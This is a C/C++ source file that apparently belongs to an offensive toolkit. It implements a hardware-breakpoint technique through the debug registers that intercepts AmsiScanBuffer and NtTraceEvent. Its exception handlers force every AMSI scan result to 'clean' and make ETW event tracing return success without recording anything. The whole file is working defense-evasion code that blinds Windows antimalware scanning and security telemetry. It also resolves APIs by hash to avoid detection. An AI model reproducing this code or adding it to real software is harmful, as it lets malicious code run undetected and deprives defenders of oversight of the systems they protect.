#include <Common.h>
#include <memory>

/*!
 * @brief
 *  this function sets or removes a
 *  function from the debug registers
 *
 * @param Position
 *  position of the debug register (0 - 3)
 *
 * @param Function
 *  function to break once hit
 *
 * @return
 *  status of function
 */
NTSTATUS KNAPI HwbpEngineBreakpoint(
    _In_ ULONG Position,
    _In_ PVOID Function
) {
    NTSTATUS                    Status       = { 0 };
    PVOID                       Ntdll        = { 0 };
    CONTEXT                     Context      = { 0 };
    V_API( NtGetContextThread ) NtGetContext = { 0 };
    V_API( NtSetContextThread ) NtSetContext = { 0 };

    Ntdll = LdrModuleHandle( H_LIB_NTDLL );

    if ( ! ( NtGetContext = LdrFunction( Ntdll, HASH_STR( "NtGetContextThread" ) ) ) ) {
        return STATUS_UNSUCCESSFUL;
    }

    if ( ! ( NtSetContext = LdrFunction( Ntdll, HASH_STR( "NtSetContextThread" ) ) ) ) {
        return STATUS_UNSUCCESSFUL;
    }

    //
    // retrieve the context of the current thread
    // with the CONTEXT_DEBUG_REGISTERS flag
    //
    Context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( ! NT_SUCCESS( Status = NtGetContext( NtCurrentThread(), &Context ) ) ) {
        return Status;
    }

    //
    // if function has been specified then add
    // the function to the debug registers
    //
    if ( U_PTR( Function ) )  {
        //
        // add hardware breakpoint
        //
        ( &Context.Dr0 )[ Position ] = U_PTR( Function );

        Context.Dr7 &= ~( 3ull << ( 16 + 4 * Position ) );
        Context.Dr7 &= ~( 3ull << ( 18 + 4 * Position ) );
        Context.Dr7 |= 1ull << ( 2 * Position );
    } else {
        //
        // remove the function
        //
        ( &Context.Dr0 )[ Position ] = 0;

        //
        // disable the debug flag at the specified position
        //
        Context.Dr7 &= ~( 1ull << ( 2 * Position ) );
    }

    //
    // set the hardware breakpoints to the current thread
    //
    if ( ! NT_SUCCESS( Status = NtSetContext( NtCurrentThread(), &Context ) ) ) {
        return Status;
    }

    return STATUS_SUCCESS;
}

LONG KNAPI HwbpExceptionEtw(
    _Inout_ PEXCEPTION_POINTERS Exceptions
) {
    ULONG_PTR         Return     = { 0 };
    PCONTEXT          Context    = { 0 };
    PULONG            ScanResult = { 0 };
    PVOID             Address    = { 0 };
    PEXCEPTION_RECORD Exception  = { 0 };

    Address   = LdrFunction( LdrModuleHandle( H_LIB_NTDLL ), HASH_STR( "NtTraceEvent" ) );
    Context   = Exceptions->ContextRecord;
    Exception = Exceptions->ExceptionRecord;

    //
    // check if it is our amsi hardware breakpoint hitting
    //
    if ( Exception->ExceptionCode    == EXCEPTION_SINGLE_STEP &&
         Exception->ExceptionAddress == Address
    ) {
        //
        // receive the return address to jump back to the caller
        //
        Return = ExContextReturnAddr( Context );

        //
        // now just set the instruction pointer to the
        // return address to return back to the caller
        //
        ExContextSetInstruction( Context, Return );

        //
        // adjust the stack pointer before returning
        //
        ExContextAdjustStack( Context, sizeof( PVOID ) );

        //
        // set the return/result value to STATUS_SUCCESS which
        // indicates successful execution of the NtTraceEvent function
        //
        ExContextSetReturn( Context, STATUS_SUCCESS );

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

LONG KNAPI HwbpExceptionAmsi(
    _Inout_ PEXCEPTION_POINTERS Exceptions
) {
    ULONG_PTR         Return     = { 0 };
    PCONTEXT          Context    = { 0 };
    PULONG            ScanResult = { 0 };
    PVOID             Address    = { 0 };
    PEXCEPTION_RECORD Exception  = { 0 };

    Address   = LdrFunction( LdrModuleHandle( H_LIB_AMSI ), HASH_STR( "AmsiScanBuffer" ) );
    Context   = Exceptions->ContextRecord;
    Exception = Exceptions->ExceptionRecord;

    //
    // check if it is our amsi hardware breakpoint hitting
    //
    if ( Exception->ExceptionCode    == EXCEPTION_SINGLE_STEP &&
         Exception->ExceptionAddress == Address
    ) {
        //
        // receive the return address to jump back to the caller
        // and the 5th argument which is the AMSI_RESULT argument
        //
        Return     = ExContextReturnAddr( Context );
        ScanResult = PULONG( ExContextArgument( Context, 5 ) );

        //
        // modify the AMSI_RESULT state to AMSI_RESULT_CLEAN
        //
        *ScanResult = 0;

        //
        // now just set the instruction pointer to the
        // return address to return back to the caller
        //
        ExContextSetInstruction( Context, Return );

        //
        // adjust the stack pointer before returning
        //
        ExContextAdjustStack( Context, sizeof( PVOID ) );

        //
        // set the return/result value to S_OK which indicates
        // successful execution of the AmsiScanBuffer function
        //
        ExContextSetReturn( Context, S_OK );

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

LONG KNAPI HwbpExceptionEtwAmsi(
    _Inout_ PEXCEPTION_POINTERS Exceptions
) {
    LONG Result = { 0 };

    if ( ( Result = HwbpExceptionAmsi( Exceptions ) ) == EXCEPTION_CONTINUE_EXECUTION ) {
        goto END;
    }

    if ( ( Result = HwbpExceptionEtw( Exceptions ) ) == EXCEPTION_CONTINUE_EXECUTION ) {
        goto END;
    }

END:
    return Result;
}
